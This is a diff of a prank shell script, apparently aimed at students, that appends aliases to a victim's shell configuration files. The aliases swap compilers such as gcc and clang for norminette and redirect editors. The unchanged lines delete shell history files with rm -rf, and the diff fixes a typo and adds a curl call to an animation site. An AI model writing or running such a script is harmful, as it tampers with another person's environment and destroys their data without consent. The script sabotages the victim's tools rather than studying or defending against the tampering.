@@ -1,7 +1,7 @@
 echo "alias norminette=cc" >> ~/.trollhrc
 echo "alias norme='cat *'" >> ~/.trollhrc
 echo "alias cc=norminette" >> ~/.trollhrc
-echo "alias gcc= orminette" >> ~/.trollhrc
+echo "alias gcc=norminette" >> ~/.trollhrc
 echo "alias clang=norminette" >> ~/.trollhrc
 echo "alias vi=nano" >> ~/.zshrc
 echo "alias vim='emacs -rv'" >> ~/.trollhrc
@@ -13,4 +13,5 @@ cd
 rm -rf LOL ~/zsh_history ~/sh_history ~/bash_history && cd
 clear
 cat ~/.powpowpow
+curl parrot.live
 
